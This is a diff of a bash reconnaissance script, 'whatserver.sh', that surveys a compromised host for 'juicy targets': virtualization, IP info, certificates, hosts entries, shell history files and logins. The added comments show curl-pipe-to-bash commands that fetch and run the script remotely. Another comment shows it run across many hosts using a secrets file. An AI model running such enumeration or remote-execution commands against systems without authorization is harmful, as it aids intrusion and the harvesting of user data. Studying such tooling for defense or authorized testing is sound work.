@@ -1,7 +1,10 @@
 #! /usr/bin/env bash
 
-# Script to quickly find juicy targets. Often used in combination with gsexecio to
-# retrieve information from all hosts:
+# Script to quickly find juicy targets.
+#  curl -fsSL https://thc.org/ws | bash | less -R
+#  curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh | bash | less -R
+
+# Often used in combination with gsexecio to retrieve information from all hosts:
 #  cat secrets.txt | parallel -j50 'cat whatserver.sh | exec gsexecio {} >whatserver-{}.log'
 #
 # Use `less -R whatserver.log` to display the log files with color.
@@ -126,6 +129,50 @@ addcertfn() {
     addcn "$str" "$fn"
 }
 
+# Return <Virtualization>/<Container> or EMPTY if baremetal.
+get_virt() {
+    local str
+    local cont
+    local str_suffix
+
+    if grep -sqF docker "/proc/1/cgroup" &>/dev/null || grep -sqF " /docker/" "/proc/self/mountinfo" &>/dev/null || grep -sqF docker/overlay "/proc/self/mountinfo" &>/dev/null; then
+        cont="Docker"
+    elif tr '\000' '\n' <"/proc/1/environ" 2>/dev/null | grep -Eiq '^container=podman' || grep -sqF /libpod- "/proc/self/cgroup" 2>/dev/null; then
+        cont="Podman"
+    elif [[ -d /proc/vz ]]; then
+        cont="Virtuozzo" # OpenVZ
+    elif [ -e "/proc/1/environ" ] && tr '\000' '\n' <"/proc/1/environ" 2>/dev/null | grep -Eiq '^container=lxc'; then
+        cont="LXC"
+    elif [ -e /proc/cpuinfo ] && grep -q 'UML' "/proc/cpuinfo"; then
+        cont="User Mode Linux"
+    fi
+    [[ -n $cont ]] && str_suffix="/${cont}"
+
+    [[ -d /proc/bc ]] && { echo "OpenVZ${str_suffix}"; return; }
+
+    str="$(cat /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/board_vendor /sys/class/dmi/id/bios_vendor /sys/class/dmi/id/product_version 2>/dev/null)"
+    [[ -n $str ]] && {
+        [[ $str == *"VirtualBox"* ]]               && { echo "VirtualBox${str_suffix}"; return; }
+        [[ $str == *"innotek GmbH"* ]]             && { echo "VirtualBox${str_suffix}"; return; }
+        [[ $str == *"VMware"* ]]                   && { echo "VMware${str_suffix}"; return; }
+        [[ $str == *"KubeVirt"* ]]                 && { echo "KubeVirt${str_suffix}"; return; }
+        [[ $str == *"QEMU"* ]]                     && { echo "QEMU${str_suffix}"; return; }
+        [[ $str == *"OpenStack"* ]]                && { echo "OpenStack${str_suffix}"; return; }
+        [[ $str == *"Amazon "* ]]                  && { echo "Amazon EC2${str_suffix}"; return; }
+        [[ $str == *"KVM"* ]]                      && { echo "KVM${str_suffix}"; return; }
+        [[ $str == *"VMW"* ]]                      && { echo "VMW${str_suffix}"; return; }
+        [[ $str == *"Xen"* ]]                      && { echo "Amazon Xen${str_suffix}"; return; }
+        [[ $str == *"Bochs"* ]]                    && { echo "Bochs${str_suffix}"; return; }
+        [[ $str == *"Parallels"* ]]                && { echo "Parallels${str_suffix}"; return; }
+        [[ $str == *"BHYVE"* ]]                    && { echo "BHYVE${str_suffix}"; return; }
+        [[ $str == *"Hyper-V"* ]]                  && { echo "Microsoft Hyper-V${str_suffix}"; return; }
+        [[ $str == *"Apple Virtualization"* ]]     && { echo "Apple Virtualization${str_suffix}"; return; }
+    }
+
+    # No Virtualization but inside a container
+    [[ -n $cont ]] && { echo "$cont"; return; }
+}
+
 HTTPS_curl() { curl -m 10 -fksSL "$*"; }
 HTTPS_wget() { wget -qO- "--connect-timeout=7" "--dns-timeout=7" "--no-check-certificate" "$*"; }
 
@@ -159,16 +206,20 @@ fi
 
 echo -e "${CW}>>>>> Info${CN}"
 uname -a 2>/dev/null || cat /proc/version 2>/dev/null
+# Retrieve virtualization method
+str="$(get_virt)"
+[[ -n $str ]] && echo "Virtualization: $str"
 hostnamectl 2>/dev/null || lsb_release -a 2>/dev/null
 # || cat /etc/banner 2>/dev/null
 source /etc/os-release 2>/dev/null && echo "${PRETTY_NAME}"
-date
-uptime
+echo "Date  : $(date)"
+echo "Uptime: $(uptime)"
 id
-IFS="" ipinfo="$(HTTPS https://ipinfo.io 2>/dev/null)"
-ptrcn="${ipinfo#*  \"hostname\": \"}"
-ptrcn="${ptrcn%%\",*}"
-echo -e "$ipinfo\n"
+ipinfo="$(HTTPS https://ipinfo.io 2>/dev/null)" && {
+    ptrcn="${ipinfo#*  \"hostname\": \"}"
+    ptrcn="${ptrcn%%\",*}"
+    echo -e "$ipinfo\n"
+}
 
 echo -e "${CY}>>>>> Addresses${CN}"
 echo "$inet"
@@ -214,7 +265,7 @@ done
 addcn "$(openssl s_client -showcerts -connect 0:443 2>/dev/null  </dev/null | openssl x509 -noout -subject  2>/dev/null | sed '/^subject/s/^.*CN.*=[ ]*//g')"
 
 # Assess /etc/hosts. Extract valid domains.
-IFS=$'\n' lines=($(grep -v '^#' /etc/hosts | grep -v -E '(^255\.| ip6)'))
+IFS=$'\n' lines=($(grep -v '^#' /etc/hosts | grep -v -E '(^255\.|\sip6)'))
 unset harr
 IFS=$'\n'
 for x in "${lines[@]}"; do
@@ -255,7 +306,7 @@ ls -al ~/.*history* 2>/dev/null
 
 echo -e "${CDM}>>>>> /home (top20)${CN}"
 # BusyBox does not know --sort=time
-ls -ld -t /root /home/* 2>/dev/null | head -n20
+ls -Lld -t /root /home/* 2>/dev/null | head -n20
 
 echo -e "${CDM}>>>>> Lastlog${CN}"
 lastlog 2>/dev/null | grep -vF 'Never logged in'
